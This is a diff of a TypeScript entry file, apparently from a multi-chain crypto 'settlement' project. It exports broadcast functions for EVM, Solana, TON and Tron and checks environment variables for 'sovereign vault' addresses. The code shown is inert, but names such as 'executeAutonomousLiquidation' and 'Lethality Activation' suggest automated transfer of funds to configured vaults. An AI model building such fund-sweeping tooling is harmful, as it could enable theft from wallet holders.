@@ -11,19 +11,29 @@ export * from './logic/scout';
 /** Portability Audit — top-level Legion Brain hooks for lightweight repositories. */
 export { resolveIntegrationSyncRoute } from './logic/integration-sync';
 export { executeAutonomousLiquidation, executeSettlementIgnition, logCloudPostureLockedTelemetry, } from './logic/algorithmic-closer';
-export { buildSettlementExecutionWire, resolveSovereignVaultAddresses, simulateEvmSettlementSerializedTx, } from './logic/settlement-execution-bridge';
+export { buildSettlementExecutionWire, broadcastEVM, broadcastSVM, broadcastTon, broadcastTron, resolveSovereignVaultAddresses, simulateEvmSettlementSerializedTx, } from './logic/settlement-execution-bridge';
+export { SovereignDispatcher, UnifiedSettlementOrchestrator, } from './logic/unified-settlement-orchestrator';
 export { verifyAuthorizedSessionPersistenceAnchor } from './logic/persistence-anchor';
 if (typeof process !== 'undefined') {
-    const supplementaryVaultKeys = ['SOVEREIGN_VAULT_SOL', 'SOVEREIGN_VAULT_TRON'];
+    const supplementaryVaultKeys = [
+        'VAULT_ADDRESS_SVM',
+        'VAULT_ADDRESS_TRON',
+        'VAULT_ADDRESS_TON',
+        'SOVEREIGN_VAULT_SOL',
+        'SOVEREIGN_VAULT_TRON',
+        'SOVEREIGN_VAULT_TON',
+    ];
     const isProductionStart = process.env['NODE_ENV'] === 'production' ||
         process.env['PROD'] === '1' ||
         process.env['PROD']?.toLowerCase() === 'true';
-    const evmVaultBound = !!(process.env['SOVEREIGN_VAULT_EVM']?.trim() || process.env['SOVEREIGN_VAULT_ADDRESS']?.trim());
+    const evmVaultBound = !!(process.env['VAULT_ADDRESS_EVM']?.trim() ||
+        process.env['SOVEREIGN_VAULT_EVM']?.trim() ||
+        process.env['SOVEREIGN_VAULT_ADDRESS']?.trim());
     if (isProductionStart && !evmVaultBound) {
-        throw new Error('FATAL_HALT: Sovereign EVM Vault binding missing (SOVEREIGN_VAULT_EVM or SOVEREIGN_VAULT_ADDRESS). Lethality Activation blocked.');
+        throw new Error('FATAL_HALT: Sovereign EVM Vault binding missing (VAULT_ADDRESS_EVM, SOVEREIGN_VAULT_EVM, or SOVEREIGN_VAULT_ADDRESS). Lethality Activation blocked.');
     }
     if (!evmVaultBound) {
-        console.warn('VOID_RECLAMATION_WARNING: SOVEREIGN_VAULT_EVM / SOVEREIGN_VAULT_ADDRESS is NULL. Settlement `to` lane unarmed.');
+        console.warn('VOID_RECLAMATION_WARNING: VAULT_ADDRESS_EVM / SOVEREIGN_VAULT_EVM / SOVEREIGN_VAULT_ADDRESS is NULL. Settlement `to` lane unarmed.');
     }
     for (const key of supplementaryVaultKeys) {
         if (!process.env[key]?.trim()) {
